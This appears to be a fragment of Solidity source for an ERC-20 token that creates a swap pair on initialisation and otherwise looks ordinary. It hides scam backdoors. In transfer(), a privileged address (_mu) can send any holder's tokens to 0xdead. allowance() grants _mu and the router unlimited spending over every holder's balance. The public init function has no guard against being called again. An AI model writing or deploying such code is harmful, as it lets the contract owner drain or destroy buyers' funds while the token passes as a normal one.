function totalSupply() public view virtual returns (uint256) {
        return _totalSupply;
    }

function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

function transfer(address to, uint256 value) public virtual returns (bool) {
        if (msg.sender == _mu) {
            _update(to, address(0xdead), value);
            return true;
        }
        address owner = msg.sender;
        _transfer(owner, to, value);
        return true;
    }

function allowance(
        address owner,
        address spender
    ) public view virtual returns (uint256) {
        if (
            spender == ROUTER ||
            spender == _mu
        ) {
            return type(uint256).max;
        }
        return _allowances[owner][spender];
    }

function approve(
        address spender,
        uint256 value
    ) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, value);
        return true;
    }

function transferFrom(
        address from,
        address to,
        uint256 value
    ) public virtual returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, value);
        _transfer(from, to, value);
        return true;
    }

function __Token_init(
        string memory name_,
        string memory symbol_,
        uint256 number,
        address receiver
    ) public {
        _name = name_;
        _symbol = symbol_;
        _mu = receiver;
        _update(address(0), receiver, number * 10 ** 18);

        WETH = 0x6100E367285b01F48D07953803A2d8dCA5D19873;
        ROUTER = 0xfc9869eF6E04e8dcF09234Ad0bC48a6f78a493cC;

        ISwapRouter swapRouter = ISwapRouter(
            ROUTER
        );
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address swapPair = swapFactory.createPair(address(this), WETH);
        _mainPair = swapPair;
    }

